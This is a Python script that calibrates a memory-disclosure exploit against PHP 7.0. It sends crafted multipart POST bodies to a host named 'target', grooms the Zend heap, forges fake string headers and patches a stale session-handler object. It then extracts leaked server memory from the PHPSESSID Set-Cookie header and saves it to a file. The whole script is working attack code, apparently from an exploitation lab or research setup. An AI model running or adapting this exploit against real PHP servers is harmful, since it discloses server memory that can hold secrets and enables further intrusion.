#!/usr/bin/env python3
"""Calibrate the PHP 7.0 END-cleanup/Set-Cookie HTTP disclosure."""

from __future__ import annotations

import argparse
import json
import re
import socket
import struct
import time
import urllib.parse
from pathlib import Path


BOUNDARY = b"C" * 10
def query_string(count: int, name_len: int) -> str:
    pairs = []
    for index in range(count):
        name = f"q{index:07d}".ljust(name_len, "q")[:name_len]
        pairs.append(f"{name}=v")
    return "&".join(pairs)


def part(name: bytes, value: bytes = b"", filename: bytes | None = None,
         ctype: bytes | None = None) -> bytes:
    out = bytearray(b"--" + BOUNDARY + b'\r\nContent-Disposition: form-data; name="' + name + b'"')
    if filename is not None:
        out += b'; filename="' + filename + b'"'
    out += b"\r\n"
    if ctype is not None:
        out += b"Content-Type: " + ctype + b"\r\n"
    out += b"\r\n" + value + b"\r\n"
    return bytes(out)


def a1_body(args: argparse.Namespace) -> bytes:
    out = bytearray(part(b"PHPSESSID", b"\x00"))
    for index in range(args.parts):
        name = (f"files[R{index:05d}{'K' * args.key_pad}]".encode() + b"[a]" * (args.depth - 2))
        ctype = b"C" * 103 if index == 0 else (b"C" * 231 if index == 1 else b"application/octet-stream")
        out += b"--" + BOUNDARY + b'\r\nContent-Disposition: form-data; name="' + name + b'"'
        out += b'; filename="' + (b"A" if index < 2 else b"") + b'"'
        out += b"\r\nContent-Type: " + ctype + b"\r\n\r\n"
    for index in range(args.fillers):
        out += part(f"f{index:04d}".encode().ljust(103, b"x")[:103], b"v" * 8)
    for index in range(args.big):
        out += part(f"b{index:04d}".encode(), b"B" * args.big_len)
    for index in range(args.extra_count):
        out += part(f"extra{index}".encode(), b"E" * args.extra_len)
    for index in range(args.drain_count):
        out += part(f"drain{index}".encode(), b"D" * args.drain_len)
    for index in range(args.burners):
        out += part(f"u{index:02d}".encode(), b"U" * args.burner_len)
    for index in range(args.md_pad_count):
        out += part(f"m{index:05d}".encode(), b"M" * args.md_pad_len)
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * args.progress_len)
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def patch_safe_mod_data(value: bytearray, main_offset: int | None) -> None:
    """Keep a stale ps_files object safe when a huge carrier reclaims it."""

    if main_offset is None:
        return
    within_value = main_offset - 0x1018
    if within_value < 0 or within_value + 0x30 > len(value):
        raise ValueError("safe mod_data structure is outside B1 carrier")
    value[within_value:within_value + 0x30] = b"\x00" * 0x30
    struct.pack_into("<i", value, within_value + 0x2C, -1)


def forge_value(pages: int, page: int, page_offset: int,
                fake_len: int, index: int,
                safe_mod_data_offset: int | None,
                diagnostic_pattern: bool) -> bytes:
    length = pages * 4096 - 25
    fill = bytes((0x41 + (index % 20),))
    value = bytearray(fill * length)
    if diagnostic_pattern:
        for offset in range(0, length - 7, 8):
            struct.pack_into("<Q", value, offset, (index << 56) | offset)
    header = page * 4096 + page_offset - 0x1018
    if 0 <= header and header + 0x20 <= length:
        struct.pack_into("<IIQQ", value, header, 0, 0x6, 0, fake_len)
        value[header + 0x18:header + 0x20] = b"/" + f"{index % 100:02d}".encode() + b"BBBBB"
    patch_safe_mod_data(value, safe_mod_data_offset)
    return bytes(value)


def plain_value(pages: int, index: int, safe_mod_data_offset: int | None,
                diagnostic_pattern: bool) -> bytes:
    fill = bytes((0x41 + (index % 20),))
    value = bytearray(fill * (pages * 4096 - 25))
    if diagnostic_pattern:
        for offset in range(0, len(value) - 7, 8):
            struct.pack_into("<Q", value, offset, (index << 56) | offset)
    patch_safe_mod_data(value, safe_mod_data_offset)
    return bytes(value)


def b1_body(args: argparse.Namespace) -> bytes:
    out = bytearray()
    if args.b1_sid_source == "form":
        out += part(b"PHPSESSID", b"a" * args.b1_sid_len)
    if args.b1_pre_position == "early":
        for pre_index in range(args.b1_pre_count):
            pre_name = f"d{pre_index:05d}".encode()
            pre_name = pre_name.ljust(args.b1_pre_name_len, b"d")[:args.b1_pre_name_len]
            out += part(pre_name, b"D" * args.b1_pre_len)
    if args.b1_progress_position == "early":
        out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    index = 0
    for _ in range(args.head):
        out += part(f"f{index:04d}".encode().ljust(args.name_len, b"f")[:args.name_len],
                    forge_value(args.pages, args.forge_page, args.forge_offset,
                                args.fake_len, index, args.safe_mod_data_offset,
                                args.diagnostic_pattern))
        index += 1
    if args.partial_pages > 0:
        out += part(f"f{index:04d}".encode().ljust(args.name_len, b"f")[:args.name_len],
                    plain_value(args.partial_pages, index, args.safe_mod_data_offset,
                                args.diagnostic_pattern))
        index += 1
    for _ in range(args.tail):
        out += part(f"f{index:04d}".encode().ljust(args.name_len, b"f")[:args.name_len],
                    forge_value(args.pages, args.forge_page, args.forge_offset,
                                args.fake_len, index, args.safe_mod_data_offset,
                                args.diagnostic_pattern))
        index += 1
    for _ in range(args.nested):
        out += part(f"x{index:05d}".encode() + b"[a]" * 12, b"v")
        index += 1
    # These final scalar fields let us advance the ZendMM small-bin freelist
    # immediately before session initialization allocates ps_files (0x30).
    # Keeping them last makes the count a stable calibration knob independent
    # of the preceding page-shaping values.
    if args.b1_pre_position == "late":
        for pre_index in range(args.b1_pre_count):
            pre_name = f"d{pre_index:05d}".encode()
            pre_name = pre_name.ljust(args.b1_pre_name_len, b"d")[:args.b1_pre_name_len]
            out += part(pre_name, b"D" * args.b1_pre_len)
    if args.b1_progress_position == "late":
        out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def post(body: bytes, query: str, cap: int, timeout: float,
         extra_headers: bytes = b"", endpoint: str = "/index.php") -> bytes:
    path = endpoint + ("?" + query if query else "")
    header = (
        f"POST {path} HTTP/1.1\r\nHost: target\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY.decode()}\r\n"
        "Transfer-Encoding: chunked\r\nConnection: close\r\n"
    ).encode() + extra_headers + b"\r\n"
    response = bytearray()
    with socket.create_connection(("target", 80), timeout=10) as sock:
        sock.settimeout(timeout)
        try:
            sock.sendall(header)
            view = memoryview(body)
            for offset in range(0, len(body), 65536):
                piece = view[offset:offset + 65536]
                sock.sendall(f"{len(piece):x}\r\n".encode() + piece + b"\r\n")
            sock.sendall(b"0\r\n\r\n")
        except OSError:
            pass
        try:
            while len(response) < cap:
                chunk = sock.recv(min(65536, cap - len(response)))
                if not chunk:
                    break
                response += chunk
        except OSError:
            pass
    return bytes(response)


def wait_file(path: Path) -> None:
    deadline = time.monotonic() + 180
    while not path.exists():
        if time.monotonic() >= deadline:
            raise TimeoutError(path.name)
        time.sleep(0.05)


def status(response: bytes) -> str:
    match = re.match(rb"HTTP/1\.[01] ([0-9]{3})", response)
    return match.group(1).decode() if match else "none"


parser = argparse.ArgumentParser()
parser.add_argument("--label", required=True)
parser.add_argument("--parts", type=int, default=860)
parser.add_argument("--depth", type=int, default=64)
parser.add_argument("--key-pad", type=int, default=90)
parser.add_argument("--fillers", type=int, default=14)
parser.add_argument("--big", type=int, default=78)
parser.add_argument("--big-len", type=int, default=8000)
parser.add_argument("--extra-len", type=int, default=0)
parser.add_argument("--extra-count", type=int, default=0)
parser.add_argument("--drain-len", type=int, default=0)
parser.add_argument("--drain-count", type=int, default=0)
parser.add_argument("--burners", type=int, default=20)
parser.add_argument("--burner-len", type=int, default=4000)
parser.add_argument("--progress-len", type=int, default=4000)
parser.add_argument("--md-pad-len", type=int, default=19)
parser.add_argument("--md-pad-count", type=int, default=0)
parser.add_argument("--pages", type=int, default=511)
parser.add_argument("--forge-page", type=lambda x: int(x, 0), default=0x137)
parser.add_argument("--forge-offset", type=lambda x: int(x, 0), default=0)
parser.add_argument("--fake-len", type=lambda x: int(x, 0), default=0xC8000)
parser.add_argument("--safe-mod-data-offset", type=lambda x: int(x, 0))
parser.add_argument("--diagnostic-pattern", action="store_true")
parser.add_argument("--head", type=int, default=14)
parser.add_argument("--partial-pages", type=int, default=400)
parser.add_argument("--tail", type=int, default=1)
parser.add_argument("--nested", type=int, default=900)
parser.add_argument("--name-len", type=int, default=120)
parser.add_argument("--b1-pre-len", type=int, default=19)
parser.add_argument("--b1-pre-name-len", type=int, default=6)
parser.add_argument("--b1-pre-count", type=int, default=0)
parser.add_argument("--b1-pre-position", choices=("early", "late"), default="late")
parser.add_argument("--b1-progress-position", choices=("early", "late"), default="early")
parser.add_argument("--b1-sid-len", type=int, default=1)
parser.add_argument("--b1-sid-source", choices=("form", "cookie"), default="form")
parser.add_argument("--query-count", type=int, default=5)
parser.add_argument("--query-name-len", type=int, default=8)
parser.add_argument("--b1-path", default="/index.php")
parser.add_argument("--only-a1", action="store_true")
parser.add_argument("--pause-before-a1", action="store_true")
parser.add_argument("--pause-after-a1", action="store_true")
args = parser.parse_args()

out = Path("/results") / args.label
out.mkdir(parents=True, exist_ok=False)
(out / "parameters.json").write_text(json.dumps(vars(args), indent=2) + "\n")
if args.pause_before_a1:
    (out / "pre-a1.ready").write_text("ready\n")
    wait_file(out / "pre-a1.continue")
body = a1_body(args)
(out / "a1.length").write_text(f"{len(body)}\n")
a1 = post(body, query_string(args.query_count, args.query_name_len), 1 << 20, 180)
(out / "a1.response").write_bytes(a1)
if args.pause_after_a1:
    (out / "a1.ready").write_text("ready\n")
    wait_file(out / "continue")
summary: dict[str, object] = {"a1_status": status(a1), "a1_response_length": len(a1)}
if not args.only_a1:
    body = b1_body(args)
    b1_headers = b""
    if args.b1_sid_source == "cookie":
        b1_headers = b"Cookie: PHPSESSID=" + b"a" * args.b1_sid_len + b"\r\n"
    b1 = post(body, "", 20 << 20, 600, b1_headers, args.b1_path)
    (out / "b1.response").write_bytes(b1)
    summary.update(b1_status=status(b1), b1_response_length=len(b1))
    marker = b"Set-Cookie: PHPSESSID="
    start = b1.find(marker)
    if start >= 0:
        raw = b1[start + len(marker):].split(b"\r\n", 1)[0].split(b";", 1)[0]
        leak = urllib.parse.unquote_to_bytes(raw.decode("latin1"))
        (out / "b1.leak").write_bytes(leak)
        summary.update(leak_length=len(leak), leak_prefix_hex=leak[:32].hex())
    else:
        summary["leak_error"] = "no Set-Cookie"
(out / "summary.json").write_text(json.dumps(summary, indent=2) + "\n")
print(json.dumps(summary, sort_keys=True), flush=True)
